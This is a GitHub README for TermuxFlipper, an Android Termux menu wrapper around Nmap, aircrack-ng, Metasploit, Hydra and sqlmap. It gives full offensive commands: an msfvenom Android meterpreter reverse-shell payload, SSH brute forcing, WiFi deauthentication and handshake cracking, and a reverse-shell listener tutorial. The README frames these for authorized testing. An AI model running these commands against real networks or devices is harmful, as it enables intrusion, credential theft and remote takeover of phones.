# Termux-Flipper-Zero
TermuxFlipper - a comprehensive Flipper Zero-inspired multi-tool for Termux. 

# 🐬 TermuxFlipper

<div align="center">

```
        ▄████████▄
      ▄█▀        ▀█▄
     █▀  ▄▄  ▄▄    ▀█
    █   █▀▀█ █▀▀█   █
   █    ▀▀▀▀ ▀▀▀▀    █
   █      ████       █
   █     ██████      █
    █    ██████     █
     █▄   ▀██▀   ▄█
      ▀█▄  ██  ▄█▀
        ▀████████▀
         ██  ██
         ██  ██
```

**Flipper Zero Inspired Multi-Tool for Termux**

[![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)](https://github.com/yourusername/termuxflipper)
[![Platform](https://img.shields.io/badge/platform-Termux-green.svg)](https://termux.com)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org)

*A comprehensive security and penetration testing toolkit for Android devices*

**Created by Agent Security** 🔐

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Tools](#-tools-included) • [Legal](#%EF%B8%8F-legal-disclaimer)

</div>

---

## 📖 About

**TermuxFlipper** is a powerful, Flipper Zero-inspired multi-tool designed specifically for Termux on Android devices. It combines essential penetration testing, network analysis, and security research tools into one convenient interface.

### Why TermuxFlipper?

- 🎯 **All-in-One**: Multiple security tools in a single interface
- 📱 **Mobile-Ready**: Optimized for Android via Termux
- 🎨 **User-Friendly**: Clean, colorful menu system
- 🔧 **Modular**: Easy to extend and customize
- 🐬 **Inspired by Flipper Zero**: Bringing hardware hacking tools to mobile

---

## ✨ Features

### 🌐 Network Scanner
- Host discovery and enumeration
- Port scanning (quick, full, service detection)
- OS fingerprinting
- Service version detection
- Network mapping

### 📡 WiFi Tools
- Network scanning and monitoring
- WPA/WPA2 handshake capture
- Password cracking with wordlists
- Monitor mode support
- Deauthentication attacks
- Packet injection

### 💣 Exploitation Tools
- Metasploit Framework integration
- SQL injection testing (SQLmap)
- Brute force attacks (Hydra)
- Reverse shell generator
- Payload creation (MSFvenom)
- Multi-protocol support

### 🔍 Information Gathering
- WHOIS lookups
- DNS enumeration
- Subdomain discovery
- Email harvesting
- Website fingerprinting
- SSL/TLS analysis

### 🕵️ Sniffing Tools
- Packet capture (tcpdump)
- ARP spoofing
- SSL stripping
- DNS spoofing
- Traffic analysis
- MITM capabilities

### 📱 Termux Specific Tools
- Device information
- Battery status monitoring
- GPS location access
- SMS tools (send/receive)
- Camera capture
- Clipboard management
- Vibration control
- Push notifications

### 🛠️ Utilities
- Custom port scanner
- Hash generator (MD5, SHA1, SHA256, SHA512)
- Base64 encoder/decoder
- Password generator
- File encryption/decryption (AES-256)
- Network diagnostics

---

## 📦 Installation

### Prerequisites

- Android device (rooted or non-rooted)
- Termux app installed ([F-Droid](https://f-droid.org/packages/com.termux/) or [Google Play](https://play.google.com/store/apps/details?id=com.termux))
- At least 2GB free storage
- Internet connection

### Quick Install

```bash
# Update Termux
pkg update && pkg upgrade -y

# Install Git
pkg install git -y

# Clone repository
git clone https://github.com/yourusername/termuxflipper.git
cd termuxflipper

# Run installer
chmod +x install.sh
./install.sh
```

### Manual Installation

```bash
# Install dependencies
pkg install python git wget curl -y

# Copy the script
cp termuxflipper.py ~/bin/flipper
chmod +x ~/bin/flipper

# Create alias
echo "alias flipper='python ~/bin/flipper'" >> ~/.bashrc
source ~/.bashrc
```

---

## 🔧 Dependencies Installation

### Core Tools

```bash
# Update package lists
pkg update && pkg upgrade -y

# Install essential packages
pkg install -y python git wget curl openssl
```

### Network Tools

```bash
# Nmap - Network scanner
pkg install nmap -y

# Netcat - Network utility
pkg install netcat -y

# Wireless tools
pkg install aircrack-ng -y
```

### Exploitation Tools

```bash
# Hydra - Password cracker
pkg install hydra -y

# Metasploit Framework
pkg install metasploit -y

# SQLmap - SQL injection tool
pkg install sqlmap -y
```

### Additional Tools

```bash
# PostgreSQL (for Metasploit)
pkg install postgresql -y
initdb $PREFIX/var/lib/postgresql
pg_ctl -D $PREFIX/var/lib/postgresql start

# Termux API (for device features)
pkg install termux-api -y
```

### All-in-One Dependency Install

```bash
pkg update && pkg upgrade -y && \
pkg install -y python git wget curl nmap netcat hydra \
metasploit sqlmap aircrack-ng postgresql openssl \
termux-api libpcap zlib openssl
```

---

## 🚀 Usage

### Starting TermuxFlipper

```bash
# Run the tool
flipper

# Or directly
python ~/bin/flipper

# Or with Python
./termuxflipper.py
```

### Main Menu

```
MAIN MENU:

1. Network Scanner
2. WiFi Tools
3. Exploitation Tools
4. Information Gathering
5. Sniffing Tools
6. Termux Specific Tools
7. Utilities
8. Check Dependencies
9. About
0. Exit
```

### Quick Examples

#### Network Scanning
```bash
# Launch TermuxFlipper
flipper

# Select: 1 (Network Scanner)
# Select: 2 (Port scan - common ports)
# Enter target: 192.168.1.1
```

#### WiFi Scanning
```bash
# Launch TermuxFlipper
flipper

# Select: 2 (WiFi Tools)
# Select: 1 (Scan WiFi networks)
```

#### Generate Reverse Shell
```bash
# Launch TermuxFlipper
flipper

# Select: 3 (Exploitation Tools)
# Select: 4 (Reverse Shell Generator)
# Choose shell type and enter LHOST/LPORT
```

---

## 🛠️ Tools Included

### Network Analysis
| Tool | Description | Root Required |
|------|-------------|---------------|
| Nmap | Network scanner and mapper | No |
| Netcat | TCP/UDP network utility | No |
| tcpdump | Packet capture tool | Yes |

### WiFi Security
| Tool | Description | Root Required |
|------|-------------|---------------|
| aircrack-ng | WPA/WPA2 cracking | No |
| airodump-ng | Packet capture | Yes |
| aireplay-ng | Packet injection | Yes |
| airmon-ng | Monitor mode | Yes |

### Exploitation
| Tool | Description | Root Required |
|------|-------------|---------------|
| Metasploit | Exploitation framework | No |
| msfvenom | Payload generator | No |
| Hydra | Brute force tool | No |
| SQLmap | SQL injection tool | No |

### Information Gathering
| Tool | Description | Root Required |
|------|-------------|---------------|
| WHOIS | Domain lookup | No |
| DNS Tools | DNS enumeration | No |
| curl/wget | HTTP clients | No |

---

## 📱 Device Compatibility

### Tested Devices
- ✅ Samsung Galaxy (A-series, S-series)
- ✅ Google Pixel
- ✅ OnePlus
- ✅ Xiaomi/Redmi
- ✅ Motorola

### Android Versions
- ✅ Android 7.0+ (Nougat)
- ✅ Android 8.0+ (Oreo)
- ✅ Android 9.0+ (Pie)
- ✅ Android 10+
- ✅ Android 11+
- ✅ Android 12+
- ✅ Android 13+
- ✅ Android 14+

### Architecture Support
- ✅ ARM64 (aarch64)
- ✅ ARM (armv7)
- ✅ x86_64
- ✅ x86

---

## 🔐 Root vs Non-Root Features

### Without Root Access ✅
- Network scanning (Nmap)
- Password cracking (aircrack-ng with capture files)
- SQL injection testing
- Brute force attacks
- Information gathering
- Hash generation
- File encryption
- Payload generation
- Most Termux API features

### Requires Root Access 🔒
- WiFi monitor mode
- Packet injection
- ARP spoofing
- DNS spoofing
- Some advanced network attacks
- System-level modifications

---

## 📚 Documentation

### Command Reference

#### Network Scanner Commands
```bash
# Quick host scan
nmap -sn 192.168.1.0/24

# Port scan
nmap -p 1-1000 192.168.1.1

# Service detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1
```

#### WiFi Commands
```bash
# Scan networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Crack password
aircrack-ng -w wordlist.txt capture-01.cap
```

#### Exploitation Commands
```bash
# Start Metasploit
msfconsole

# Generate Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk

# Brute force SSH
hydra -l user -P pass.txt ssh://192.168.1.1

# SQL injection
sqlmap -u "http://target.com/page?id=1" --dbs
```

---

## 🎓 Tutorials

### Tutorial 1: Basic Network Scan

```bash
# 1. Launch TermuxFlipper
flipper

# 2. Select Network Scanner
[1]

# 3. Choose Quick host discovery
[1]

# 4. Enter target network
192.168.1.0/24

# 5. View results
```

### Tutorial 2: WiFi Password Cracking

```bash
# 1. Enable monitor mode (requires root)
su
airmon-ng start wlan0

# 2. Scan for networks
airodump-ng wlan0mon

# 3. Capture handshake
airodump-ng -c [CHANNEL] --bssid [TARGET] -w capture wlan0mon

# 4. Deauth to force handshake (new terminal)
aireplay-ng --deauth 10 -a [TARGET] wlan0mon

# 5. Crack password
aircrack-ng -w rockyou.txt capture-01.cap
```

### Tutorial 3: Generate and Use Reverse Shell

```bash
# 1. Generate reverse shell
flipper -> Exploitation Tools -> Reverse Shell Generator
LHOST: Your IP
LPORT: 4444

# 2. Start listener
nc -lvp 4444

# 3. Execute shell on target
# Copy and paste generated command on target
```

---

## 🔧 Troubleshooting

### Common Issues

#### "Command not found"
```bash
# Check if tool is installed
which nmap

# Install missing tool
pkg install nmap -y
```

#### "Permission denied"
```bash
# Make script executable
chmod +x termuxflipper.py

# Or for binary
chmod +x ~/bin/flipper
```

#### "No wireless interfaces found"
```bash
# Check WiFi interface
ip link show

# Try different interface name
# Common: wlan0, wlan1, wlo1
```

#### PostgreSQL errors (Metasploit)
```bash
# Initialize database
initdb $PREFIX/var/lib/postgresql

# Start PostgreSQL
pg_ctl -D $PREFIX/var/lib/postgresql start

# Reinitialize Metasploit database
msfdb reinit
```

#### Aircrack-ng not working
```bash
# Reinstall from source
cd ~
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure --prefix=$PREFIX
make && make install
```

---

## 🤝 Contributing

We welcome contributions! Here's how you can help:

### Ways to Contribute
- 🐛 Report bugs
- 💡 Suggest new features
- 📝 Improve documentation
- 🔧 Submit pull requests
- ⭐ Star the repository

### Development Setup

```bash
# Fork and clone the repository
git clone https://github.com/yourusername/termuxflipper.git
cd termuxflipper

# Create a new branch
git checkout -b feature-name

# Make your changes

# Test thoroughly
python termuxflipper.py

# Commit and push
git add .
git commit -m "Add feature: description"
git push origin feature-name

# Create pull request on GitHub
```

### Code Style
- Use Python 3.x
- Follow PEP 8 guidelines
- Add comments for complex logic
- Test on multiple devices
- Update documentation

---

## 📝 Changelog

### Version 1.0.0 (2025-10-05)
- ✨ Initial release
- 🌐 Network scanner module
- 📡 WiFi tools integration
- 💣 Exploitation framework
- 🔍 Information gathering tools
- 🕵️ Sniffing capabilities
- 📱 Termux API integration
- 🛠️ Utility functions
- 🎨 Flipper Zero ASCII logo
- 📖 Complete documentation

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2025 Agent Security

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
```

---

## ⚠️ Legal Disclaimer

**IMPORTANT - READ CAREFULLY:**

This tool is provided for **educational purposes** and **authorized security testing only**.

### Legal Use Only
- ✅ Use on networks/systems you **OWN**
- ✅ Use with **explicit written permission**
- ✅ Use for **authorized penetration testing**
- ✅ Use for **security research** in controlled environments
- ✅ Use for **educational purposes**

### Illegal Use (DO NOT)
- ❌ Unauthorized access to networks/systems
- ❌ Accessing others' WiFi without permission
- ❌ Any form of cyber attack
- ❌ Violating computer fraud laws
- ❌ Stalking or harassment
- ❌ Any illegal activity

### Your Responsibility
- You are **solely responsible** for your actions
- The developers assume **no liability** for misuse
- Unauthorized hacking is **ILLEGAL** in most countries
- Violations can result in **criminal prosecution**
- Know and follow your **local laws**

### Penalties for Misuse
Unauthorized access can result in:
- **Criminal charges**
- **Heavy fines** ($10,000+)
- **Imprisonment** (up to 20 years)
- **Civil lawsuits**
- **Permanent criminal record**

**By using this tool, you agree to use it ethically and legally.**

---

## 🌟 Credits & Acknowledgments

### Developed By
**Agent Security** 🛡️

### Built With
- Python 3.x
- Termux
- Various open-source security tools

### Special Thanks To
- Flipper Zero team for inspiration
- Termux developers
- Aircrack-ng team
- Metasploit Framework
- Nmap project
- The cybersecurity community

### Tools Integrated
- [Nmap](https://nmap.org/) - Network scanner
- [Aircrack-ng](https://www.aircrack-ng.org/) - WiFi security
- [Metasploit](https://www.metasploit.com/) - Exploitation framework
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) - Password cracker
- [SQLmap](https://sqlmap.org/) - SQL injection tool

---

## 📞 Support & Contact

### Get Help
- 📖 [Read the Documentation](#-documentation)
- 🐛 [Report Issues](https://github.com/yourusername/termuxflipper/issues)
- 💬 [Discussions](https://github.com/yourusername/termuxflipper/discussions)
- ⭐ [Star on GitHub](https://github.com/yourusername/termuxflipper)

### Community
- Join our discussions
- Share your experiences
- Help other users
- Contribute to development

### Stay Updated
- Watch the repository
- Follow releases
- Check changelog regularly

---

## 🎯 Roadmap

### Planned Features
- [ ] Bluetooth tools integration
- [ ] NFC reader/writer
- [ ] RFID tools
- [ ] More payload templates
- [ ] GUI mode option
- [ ] Automated report generation
- [ ] Plugin system
- [ ] Cloud integration
- [ ] Multi-language support
- [ ] Advanced logging

### Version 2.0 Goals
- Enhanced Flipper Zero feature parity
- Hardware integration support
- Advanced automation scripts
- Improved UI/UX
- Better error handling
- Performance optimizations

---

## 💖 Support the Project

If you find TermuxFlipper useful, consider:

- ⭐ **Star** the repository
- 🍴 **Fork** and contribute
- 📢 **Share** with others
- 🐛 **Report** bugs
- 💡 **Suggest** features
- 📝 **Write** tutorials

---

## 📊 Stats

![GitHub stars](https://img.shields.io/github/stars/yourusername/termuxflipper?style=social)
![GitHub forks](https://img.shields.io/github/forks/yourusername/termuxflipper?style=social)
![GitHub issues](https://img.shields.io/github/issues/yourusername/termuxflipper)
![GitHub pull requests](https://img.shields.io/github/issues-pr/yourusername/termuxflipper)

---

<div align="center">

**Made with ❤️ by Agent Security**

*Bringing Flipper Zero's power to your Android device*

🐬 **TermuxFlipper** - *Hack Responsibly* 🔐

---

**⚡ Happy Hacking! ⚡**

*(Remember: With great power comes great responsibility)*

</div>